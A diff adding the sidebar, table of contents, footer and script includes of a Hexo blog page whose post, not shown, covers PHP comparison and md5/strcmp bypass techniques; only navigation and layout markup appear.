+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%AD%89%E6%AF%94%E8%BE%83"><span class="nav-number"></span> <span class="nav-text">关于弱类型等比较</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83"><span class="nav-number"></span> <span class="nav-text">字符串与数字比较</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%AD%97%E7%9B%B8%E7%AD%89"><span class="nav-number">1.</span> <span class="nav-text">字符串与数字相等</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%AF%94%E5%A4%A7%E5%B0%8F"><span class="nav-number">2.</span> <span class="nav-text">整数比大小</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81"><span class="nav-number"></span> <span class="nav-text">urldecode二次编码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#md5-sha-%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-number"></span> <span class="nav-text">md5()&#x2F;sha()的绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#strcmp%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number"></span> <span class="nav-text">strcmp比较字符串</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83"><span class="nav-number"></span> <span class="nav-text">过滤数字进行比较</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number"></span> <span class="nav-text">extract变量覆盖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E4%BC%A0%E5%85%A5%E7%9A%84%E5%8C%B9%E9%85%8D"><span class="nav-number"></span> <span class="nav-text">限制传入的匹配</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JSON"><span class="nav-number"></span> <span class="nav-text">JSON</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95"><span class="nav-number"></span> <span class="nav-text">科学计数法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86%E7%9B%B8%E7%AD%89"><span class="nav-number">1.</span> <span class="nav-text">编码加密相等</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">长度限制绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
